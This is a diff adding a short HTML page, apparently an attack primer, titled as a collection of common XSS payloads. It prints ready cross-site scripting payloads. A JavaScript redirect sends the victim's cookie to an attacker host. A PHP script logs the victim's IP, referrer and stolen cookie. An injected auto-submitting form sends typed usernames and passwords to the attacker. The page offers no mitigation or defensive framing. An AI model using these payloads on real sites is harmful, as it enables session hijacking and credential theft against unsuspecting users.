@@ -1,0 +1,24 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Mega Primer Common XSS Payloads</title>
+</head><body>The most popular CSS/XSS attack (and devastating) is the harvesting of authentication cookies and session management tokens. With this information, it is often a trivial exercise for an attacker to hijack the victims active session, completely bypassing the authentication process.<br/>
+<br/>
+The simplest jump point is JavaScript code to redirect a page. With this method variables accessible only under that document may be sent to a payload page:<br/>
+document.location.replace('http://attacker/payload?c='+document.cookie);<br/>
+<br/>
+The code below logs the visitor IP, referrer, and a cookie value stored in “c”:<br/>
+&lt;?php<br/>
+$f = fopen(“log.txt”, “a”);<br/>
+fwrite($f, “IP: {$_SERVER[‘REMOTE_ADDR’]} Ref: {$_SERVER<br/>
+[‘HTTP_REFERER’]} Cookie: {$HTTP_GET_VARS[‘c’]}\n”);<br/>
+fclose($f);<br/>
+?&gt;<br/>
+<br/>
+Jump code may be formed to exploit the weak password management system and send clear text logins and passwords to the payload script.<br/>
+&lt;form name=form1 method=POST action=”http://host/script” onSubmit=”document.location.replace('http://attacker/payload?u='+document.form1.username.value+'&amp;p='+document.form1.password.value)”&gt;<br/>
+&lt;input type=text name=username&gt;<br/>
+&lt;input type=password name=password&gt;<br/>
+&lt;/form&gt;<br/>
+&lt;script&gt;form1.submit()&lt;/script&gt;</body></html>
